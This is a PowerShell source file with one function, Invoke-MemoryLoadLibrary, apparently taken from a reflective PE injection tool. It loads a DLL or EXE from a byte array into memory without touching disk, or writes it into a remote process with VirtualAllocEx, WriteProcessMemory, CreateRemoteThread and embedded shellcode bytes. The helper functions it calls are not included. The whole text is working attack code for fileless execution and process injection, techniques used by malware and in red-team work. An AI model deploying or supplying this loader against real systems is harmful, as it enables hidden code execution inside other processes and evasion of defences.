Function Invoke-MemoryLoadLibrary
{
    Param(
    [Parameter( Position = 0, Mandatory = $true )]
    [Byte[]]
    $PEBytes,
    
    [Parameter(Position = 1, Mandatory = $false)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 2, Mandatory = $false)]
    [IntPtr]
    $RemoteProcHandle
    )
    
    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    
    #Get Win32 constants and functions
    $Win32Constants = Get-Win32Constants
    $Win32Functions = Get-Win32Functions
    $Win32Types = Get-Win32Types
    
    $RemoteLoading = $false
    if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
    {
        $RemoteLoading = $true
    }
    
    #Get basic PE information
    Write-Verbose "Getting basic PE information from the file"
    $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
    $OriginalImageBase = $PEInfo.OriginalImageBase
    $NXCompatible = $true
    if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
    {
        Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
        $NXCompatible = $false
    }
    
    
    #Verify that the PE and the current process are the same bits (32bit or 64bit)
    $Process64Bit = $true
    if ($RemoteLoading -eq $true)
    {
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
        if ($Result -eq [IntPtr]::Zero)
        {
            Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
        }
        
        [Bool]$Wow64Process = $false
        $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
        if ($Success -eq $false)
        {
            Throw "Call to IsWow64Process failed"
        }
        
        if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
        {
            $Process64Bit = $false
        }
        
        #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
        $PowerShell64Bit = $true
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
        {
            $PowerShell64Bit = $false
        }
        if ($PowerShell64Bit -ne $Process64Bit)
        {
            throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
        }
    }
    else
    {
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
        {
            $Process64Bit = $false
        }
    }
    if ($Process64Bit -ne $PEInfo.PE64Bit)
    {
        Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
    }
    

    #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
    Write-Verbose "Allocating memory for the PE and write its headers to memory"
    
    [IntPtr]$LoadAddr = [IntPtr]::Zero
    if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
    {
        Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
        [IntPtr]$LoadAddr = $OriginalImageBase
    }

    $PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
    $EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
    if ($RemoteLoading -eq $true)
    {
        #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
        $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        
        #todo, error handling needs to delete this memory if an error happens along the way
        $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($EffectivePEHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
        }
    }
    else
    {
        if ($NXCompatible -eq $true)
        {
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        }
        else
        {
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        }
        $EffectivePEHandle = $PEHandle
    }
    
    [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
    if ($PEHandle -eq [IntPtr]::Zero)
    { 
        Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
    }		
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
    
    
    #Now that the PE is in memory, get more detailed information about it
    Write-Verbose "Getting detailed PE information from the headers loaded in memory"
    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
    $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
    $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
    Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
    
    
    #Copy each section from the PE in to memory
    Write-Verbose "Copy PE sections in to memory"
    Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
    
    
    #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
    Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
    Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

    
    #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
    Write-Verbose "Import DLL's needed by the PE we are loading"
    if ($RemoteLoading -eq $true)
    {
        Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
    }
    else
    {
        Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
    }
    
    
    #Update the memory protection flags for all the memory just allocated
    if ($RemoteLoading -eq $false)
    {
        if ($NXCompatible -eq $true)
        {
            Write-Verbose "Update memory protection flags"
            Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
        }
        else
        {
            Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
        }
    }
    else
    {
        Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
    }
    
    
    #If remote loading, copy the DLL in to remote process memory
    if ($RemoteLoading -eq $true)
    {
        [UInt32]$NumBytesWritten = 0
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
        if ($Success -eq $false)
        {
            Throw "Unable to write shellcode to remote process memory."
        }
    }
    
    
    #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
    if ($PEInfo.FileType -ieq "DLL")
    {
        if ($RemoteLoading -eq $false)
        {
            Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
            $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
            $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
            
            $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
        }
        else
        {
            $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        
            if ($PEInfo.PE64Bit -eq $true)
            {
                #Shellcode: CallDllMain.asm
                $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            }
            else
            {
                #Shellcode: CallDllMain.asm
                $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
            }
            $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
    }
    elseif ($PEInfo.FileType -ieq "EXE")
    {
        #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
        [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
        $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

        #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
        #	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
        [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

        $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

        while($true)
        {
            [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
            if ($ThreadDone -eq 1)
            {
                Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                Write-Verbose "EXE thread has completed."
                break
            }
            else
            {
                Start-Sleep -Seconds 1
            }
        }
    }
    
    return @($PEInfo.PEHandle, $EffectivePEHandle)
}